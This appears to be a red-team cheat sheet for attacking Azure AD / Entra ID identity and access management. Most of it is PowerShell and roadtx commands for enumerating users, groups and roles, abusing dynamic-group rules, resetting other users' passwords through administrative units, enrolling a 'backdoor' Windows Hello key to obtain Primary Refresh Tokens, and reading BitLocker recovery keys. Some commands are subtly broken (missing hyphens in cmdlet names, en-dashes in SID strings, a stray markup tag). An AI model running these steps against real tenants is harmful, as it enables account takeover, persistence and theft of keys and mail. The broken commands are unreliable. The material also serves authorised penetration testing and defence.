# Azure AD - IAM

> Root Management Group (Tenant) > Management Group > Subscription > Resource Group > Resource

* Users (User, Groups, Dynamic Groups)
* Devices
* Service Principals (Application and Managed Identities)

## Users

* List users: `Get-AzureADUser -All $true`
* Enumerate groups

    ```ps1
    # List groups
    Get-AzureADGroup -All $true
    
    # Get members of a group
    Get-AzADGroup -DisplayName '<GROUP-NAME>'
    Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName
    ```

* Enumerate roles: `Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember`
* List roles: `Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName`
* Add user to a group

    ```ps1
    $groupid = "<group-id>"
    $targetmember = "<user-id>"
    $group = Get-MgGroup -GroupId $groupid
    $members = Get-MgGroupMember -GroupId $groupid
    New-MgGroupMember -GroupId $groupid -DirectoryObjectid $targetmember
    ```


### Dynamic Group Membership

Get groups that allow Dynamic membership: 

* Powershell Azure AD: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`
* RoadRecon database: `select objectId, displayName, description, membershipRule, membershipRuleProcessingState, isMembershipRuleLocked from groups where membershipRule is not null;`

Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`     
Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group

1. Open user's profile, click on **Manage**
2. Click on **Resend** invite and to get an invitation URL
3. Set the secondary email
    ```powershell
    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
    ```


### Administrative Unit

Administrative Unit can reset password of another user

```powershell
PS AzureAD> Get-AzureADMSAdministrativeUnit -All $true
PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl
PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId>
PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl

PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
```


### Convert GUID to SID

The user's Entra ID is translated to SID by concatenating `"S-1–12–1-"` to the decimal representation of each section of the Entra ID.

```powershell
GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
```

For example, the representation of `6aa89ecb-1f8f-4d92–810d-b0dce30b6c82` is `S-1–12–1–1789435595–1301421967–3702525313–2188119011`

## Devices

### List Devices

```ps1
Connect-AzureAD
Get-AzureADDevice
$user = Get-AzureADUser -SearchString "username"
Get-AzureADUserRegisteredDevice -ObjectId $user.ObjectId -All $true
```


### Device State

```ps1
PS> dsregcmd.exe /status
+----------------------------------------------------------------------+
| Device State |
+----------------------------------------------------------------------+
 AzureAdJoined : YES
 EnterpriseJoined : NO
 DomainJoined : NO
 Device Name : jumpvm
```

* **Azure AD Joined** : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large
* **Workplace Joined** : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large
* **Hybrid Joined** : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large
* **Workplace joined on AADJ or Hybrid** : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large


### Join Devices

* [Enroll Windows 10/11 devices in Intune](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)


### Register Devices

```ps1
roadtx device -a register -n swkdeviceup
```


### Windows Hello for Business

```ps1
roadtx.exe prtenrich --ngcmfa-drs-auth
roadtx.exe winhello -k swkdevicebackdoor.key
roadtx.exe prt -hk swkdevicebackdoor.key -u <user@domain.lab> -c swkdeviceup.pem -k swkdeviceup.key
roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
```


### Bitlocker Keys

```ps1
Install-Module Microsoft.Graph -Scope CurrentUser
Import-Module Microsoft.Graph.Identity.SignIns
Connect-MgGraph -Scopes BitLockerKey.Read.All
Get-MgInformationProtectionBitlockerRecoveryKey -All
Get-MgInformationProtectionBitlockerRecoveryKey -BitlockerRecoveryKeyId $bitlockerRecoveryKeyId
```


## Service Principals

```ps1
PS C:\> Get-AzureADServicePrincipal

ObjectId                             AppId                                DisplayName
--------                             -----                                -----------
00221b6f-4387-4f3f-aa85-34316ad7f956 e5e29b8a-85d9-41ea-b8d1-2162bd004528 Tenant Schema Extension App
012f6450-15be-4e45-b8b4-e630f0fb70fe 00000005-0000-0ff1-ce00-000000000000 Microsoft.YammerEnterprise
06ab01eb-3e77-4d14-ae31-322c7730a65b 09abbdfd-ed23-44ee-a2d9-a627aa1c90f3 ProjectWorkManagement
092aaf41-23e8-46eb-8c3d-fc0ee91cc62f 507bc9da-c4e2-40cb-96a7-ac90df92685c Office365Reports
0ac66e69-5502-4406-a294-6dedeadc8cab 2cf9eb86-36b5-49dc-86ae-9a63135dfa8c AzureTrafficManagerandDNS
0c0a6d9d-48c0-4aa7-b484-4e46f77d8ed9 0f698dd4-f011-4d23-a33e-b36416dcb1e6 Microsoft.OfficeClientService
0cbef08e-a4b5-4dd9-865e-8f521c1c5fb4 0469d4cd-df37-4d93-8a61-f8c75b809164 Microsoft Policy Administration Service
0ea80ff0-a9ea-43b6-b876-d5989efd8228 00000009-0000-0000-c000-000000000000 Microsoft Power BI Reporting and Analytics</dev:code>
```


## Other

Lists all the client IDs you can use to get a token with the `mail.read` scope on the Microsoft Graph:

```ps1
roadtx getscope -s https://graph.microsoft.com/mail.read
roadtx findscope -s https://graph.microsoft.com/mail.read
```


## References

* [Pentesting Azure Mindmap](https://github.com/synacktiv/Mindmaps)
* [AZURE AD cheatsheet - BlackWasp](https://hideandsec.sh/books/cheatsheets-82c/page/azure-ad)
* [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)
* [AZURE AD INTRODUCTION FOR RED TEAMERS - Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)